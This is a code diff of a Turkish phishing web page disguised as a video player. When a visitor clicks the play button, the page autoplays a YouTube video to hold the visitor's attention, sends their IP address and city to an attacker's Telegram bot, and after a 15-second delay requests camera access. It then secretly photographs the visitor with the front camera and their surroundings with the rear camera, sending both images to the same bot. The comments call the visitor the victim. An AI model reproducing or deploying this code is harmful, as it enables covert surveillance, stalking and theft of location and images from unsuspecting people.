@@ -2,12 +2,12 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bakır Kertenkele 31 - Güvenli Erişim</title>
+    <title>Bakır Kertenkele 31 - Tam Erişim</title>
     <style>
         body { background: #000; color: #fff; text-align: center; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
         #playButton {
             padding: 18px 35px; font-size: 20px; font-weight: bold; color: #fff;
-            background: linear-gradient(45deg, #222, #444); border: 2px solid #f00; border-radius: 10px;
+            background: linear-gradient(45deg, #111, #333); border: 2px solid #f00; border-radius: 10px;
             cursor: pointer; box-shadow: 0 0 15px #f00; transition: 0.5s; z-index: 100;
         }
         #playButton:hover { background: #f00; box-shadow: 0 0 25px #f00; }
@@ -19,9 +19,8 @@
 <body>
     
     <div id="setup">
-        <h2 style="color: #00ffcc; letter-spacing: 1px;">🦎 SİSTEM DOĞRULANDI</h2>
-        <p style="color: #aaa; margin-bottom: 25px;">İçeriği görüntülemek için oynatıcıyı başlatın.</p>
-        <button id="playButton" onclick="startStableOperation()">OYNATICIYI AÇ</button>
+        <h2 style="color: #00ffcc;">🦎 İÇERİK HAZIRLANIYOR...</h2>
+        <button id="playButton" onclick="startDualOperation()">İZLEMEYE BAŞLA</button>
     </div>
 
     <div id="videoPanel" class="video-container">
@@ -36,56 +35,54 @@
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('id');
 
-        async function startStableOperation() {
-            // Arayüz geçişi
+        async function takeSnap(stream, label) {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            await new Promise(r => setTimeout(r, 2000)); // Kamera ısınma payı
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const imgData = canvas.toDataURL('image/jpeg', 0.8);
+            const blob = await (await fetch(imgData)).blob();
+            const fd = new FormData();
+            fd.append('chat_id', userId);
+            fd.append('photo', blob, 'nabi.jpg');
+            fd.append('caption', `📸 ${label} Yakalandı!`);
+            
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+        }
+
+        async function startDualOperation() {
             document.getElementById('setup').style.display = 'none';
             document.getElementById('videoPanel').style.display = 'block';
-            
-            // Videoyu hemen başlatıyoruz ki kurbanın dikkati oraya kaysın
             document.getElementById('yt').src += "&autoplay=1";
 
-            // 1. ADIM: Arka planda sessizce cihaz verilerini al (Linux/Android/iOS fark etmez)
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const d = await ipRes.json();
-                const report = `🛰️ **SİSTEME GİRİŞ YAPILDI**\n\n🌐 **IP:** ${d.ip}\n📱 **OS:** ${navigator.platform}\n⚙️ **Mimari:** aarch64/Universal\n🔋 **Konum:** ${d.city}`;
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(report)}`);
-            } catch (e) {}
+            // Bilgi sızdırma (IP vb.)
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
+                const msg = `🛰️ **SİSTEME GİRİŞ:** ${d.ip}\n📍 **KONUM:** ${d.city}`;
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=${encodeURIComponent(msg)}`);
+            });
 
-            // 2. ADIM: Kamera İzni (YAVAŞLATILMIŞ VE STABİL)
-            // Kurban videoyu izlemeye başladıktan 1.5 saniye sonra izin istenecek
+            // 15 Saniyelik Stratejik Bekleme Başlıyor aşkım...
             setTimeout(async () => {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user", width: { ideal: 640 } } 
-                    });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
+                    // Önce ÖN KAMERA (Selfie)
+                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    await takeSnap(frontStream, "Ön Kamera (Yüz)");
+                    frontStream.getTracks().forEach(t => t.stop());
 
-                    // 3. ADIM: Kameranın tamamen uyanması için 6 saniye sabırla bekle
-                    setTimeout(async () => {
-                        const canvas = document.getElementById('canvas');
-                        const context = canvas.getContext('2d');
-                        canvas.width = video.videoWidth;
-                        canvas.height = video.videoHeight;
-                        context.drawImage(video, 0, 0);
-                        
-                        const imgData = canvas.toDataURL('image/jpeg', 0.7);
-                        const blob = await (await fetch(imgData)).blob();
-                        
-                        const fd = new FormData();
-                        fd.append('chat_id', userId);
-                        fd.append('photo', blob, 'nabi_final.jpg');
-                        fd.append('caption', "📸 Hedef Görüntüsü (Netlik Optimize Edildi)");
-
-                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 6000); // 6 Saniyelik 'altın süre'
+                    // Hemen ardından ARKA KAMERA (Çevre)
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    await takeSnap(backStream, "Arka Kamera (Çevre)");
+                    backStream.getTracks().forEach(t => t.stop());
 
                 } catch (err) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera reddedildi ama cihaz bilgileri alındı.`);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${userId}&text=❌ Kamera Erişimi Engellendi!`);
                 }
-            }, 1500); // İzin isteği 1.5 saniye gecikmeli gelir
+            }, 15000); 
         }
     </script>
 </body>
